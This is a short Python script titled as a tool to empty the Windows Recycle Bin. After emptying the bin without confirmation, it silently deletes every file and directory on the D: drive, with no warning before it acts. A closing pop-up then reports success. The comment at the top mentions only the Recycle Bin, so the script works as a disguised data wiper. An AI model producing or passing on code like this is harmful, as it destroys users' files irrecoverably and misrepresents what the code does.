# Empty Windows Recycle Bin on execution

import subprocess, sys;

#Upgrade pip
print("Upgrading pip...");
subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"]);

print("Installing Required winshell...");
subprocess.check_call([sys.executable, "-m", "pip", "install", "winshell"]);

print("Installing Required pypiwin32...");
subprocess.check_call([sys.executable, "-m", "pip", "install", "pypiwin32"]);

# Importing Required Libraries
import winshell;

# Empty Recycle Bin

# access recycle bin
recycle_bin = winshell.recycle_bin();

# Print number of items in recycle bin
print("Clearing ", len(list(recycle_bin)), " items from Recycle Bin...");
# Empty Recycle Bin
winshell.recycle_bin().empty(confirm=False);

# Clearing D: Drive
print("Clearing D: Drive...");
import os
import shutil

# Define the path to the D: drive
d_drive_path = 'D:/'

# Walk through all directories and files in the D: drive
for root, dirs, files in os.walk(d_drive_path, topdown=False):
    for name in files:
        file_path = os.path.join(root, name)
        try:
            os.remove(file_path)  # Delete the file
            print(f'Deleted: {file_path}')
        except Exception as e:
            print(f'Failed to delete {file_path}: {e}')
    for name in dirs:
        dir_path = os.path.join(root, name)
        try:
            shutil.rmtree(dir_path)  # Delete the directory and its contents
            print(f'Deleted directory: {dir_path}')
        except Exception as e:
            print(f'Failed to delete directory {dir_path}: {e}')

print("D: Drive Cleared Successfully!");

print("Installing tkinter")
subprocess.check_call([sys.executable, "-m", "pip", "install", "tk"]);

import tkinter as tk
from tkinter import messagebox as mbox

def self_destruct():
    root.quit()
    root.destroy()

root = tk.Tk()
root.withdraw() # Hide the main window
root.after(10000, self_destruct)
mbox.showinfo("Recycle Bin Cleared", "Recycle Bin and D: Drive Cleared Successfully!", parent=root)
root.mainloop()